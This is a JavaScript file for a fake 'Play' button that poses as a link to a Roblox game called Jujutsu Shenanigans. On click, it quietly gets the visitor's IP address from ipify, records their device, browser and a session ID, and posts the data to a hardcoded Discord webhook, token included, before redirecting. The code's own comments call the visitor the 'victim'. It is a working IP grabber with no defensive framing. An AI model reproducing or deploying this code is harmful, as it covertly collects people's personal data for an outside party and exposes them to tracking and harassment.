// Function to send captured data to a Discord webhook
function sendDataToDiscordWebhook(hiddenData, webhookURL) {
    var xhr = new XMLHttpRequest();
  
    var requestBody = {
      content: `\n# There's new one click on the play button of Jujutsu Shenanigans Website\n## IP Address: ${hiddenData.ip}\n## Session ID: ${hiddenData.sessionID}\n## Device Type: ${hiddenData.deviceName}\n## Browser: ${hiddenData.browser}\n\n`,
      username: "Luxn Link",
      avatar_url: "https://cdn.pfps.gg/pfps/9553-zankuro-bandage-boobs.gif"
    };
  
    xhr.onreadystatechange = function() {
      if (xhr.readyState === 4) {
        if (xhr.status >= 200 && xhr.status < 300) {
          console.log('Data successfully sent to Discord webhook.');
          // Redirect the user to the specified website
          window.location.href = "https://www.roblox.com/games/9391468976/PERFECTION-Jujutsu-Shenanigans";
        } else {
          console.log('Failed to send data to Discord webhook. Status code:', xhr.status, ', Status text:', xhr.statusText);
        }
      }
    };
  
    xhr.open('POST', webhookURL);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify(requestBody));
  }
  
  // Global Variables
  var victimData = [];
  var victimIP = "";
  var sessionID = "";
  
  // Function to handle the victim's click on the 'Play' button
  document.getElementById('playButton').addEventListener('click', function() {
    getVictimDetails();
  
    // Function to generate a unique session ID
    function generateSessionID() {
      return randomAlphaNumString(16);
    }
  
    // Function to retrieve the victim's IP address.
    function getVictimIPAddress(callback) {
      var xhr = new XMLHttpRequest();
      xhr.open('GET', "https://api.ipify.org?format=json", true);
      xhr.onload = function() {
        if (xhr.status >= 200 && xhr.status < 300) {
          var response = JSON.parse(xhr.responseText);
          victimIP = response.ip;
          callback();
        } else {
          console.log('Failed to retrieve the victim\'s IP address.');
        }
      };
      xhr.onerror = function() {
        console.log('Failed to retrieve the victim\'s IP address.');
      };
      xhr.send();
    }
  
    // Function to get the device name
    function getDeviceName() {
      var userAgent = navigator.userAgent;
      var deviceName = "Unknown Device";
  
      if (/mobile/i.test(userAgent)) {
        deviceName = "mobile";
      } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
        deviceName = "iOS";
      } else if (/Android/.test(userAgent)) {
        deviceName = "Android";
      } else if (/Linux/.test(userAgent)) {
        deviceName = "Linux";
      } else if (/Mac/.test(userAgent)) {
        deviceName = "Mac";
      } else if (/Win/.test(userAgent)) {
        deviceName = "Windows";
      }
  
      return deviceName;
    }
  
    // Function to get the browser type
    function getBrowserType() {
      var userAgent = navigator.userAgent;
      var browser = "Unknown Browser";
  
      if (/Chrome/.test(userAgent) && /Google Inc/.test(navigator.vendor)) {
        browser = "Google Chrome";
      } else if (/Chrome/.test(userAgent) && /OPR/.test(userAgent)) {
        browser = "Opera";
      } else if (/Firefox/.test(userAgent)) {
        browser = "Mozilla Firefox";
      } else if (/Safari/.test(userAgent) && !/Chrome/.test(userAgent)) {
        browser = "Apple Safari";
      } else if (/MSIE|Trident/.test(userAgent)) {
        browser = "Microsoft Internet Explorer";
      } else if (/Edg/.test(userAgent)) {
        browser = "Microsoft Edge";
      } else if (/Brave/.test(userAgent)) {
        browser = "Brave";
      }
  
      return browser;
    }
  
    // Function to retrieve victim details
    function getVictimDetails() {
      sessionID = generateSessionID();
      getVictimIPAddress(function() {
        var deviceName = getDeviceName();
        var browser = getBrowserType();
        var hiddenData = {
          ip: victimIP,
          sessionID: sessionID,
          deviceName: deviceName,
          browser: browser
        };
  
        // Send the captured data to the Discord webhook using the 'sendDataToDiscordWebhook' function.
        sendDataToDiscordWebhook(hiddenData, "https://discord.com/api/webhooks/1309554693759832194/40MCe1z54B_1d5UPGcaETrHSocLAO8VZuEg7RgGWFwyfPa56op7RXDmVfSlCiQ2dvOTP");
  
        // Log the complete data set for debugging purposes
        console.log('Complete data set:', victimData);
      });
    }
  });
  
  // Function to generate a random alphanumeric string of given length
  function randomAlphaNumString(length) {
    var result = '';
    var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charLength = length;
    for (var i = 0; i < charLength; i++) {
      result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
  }
  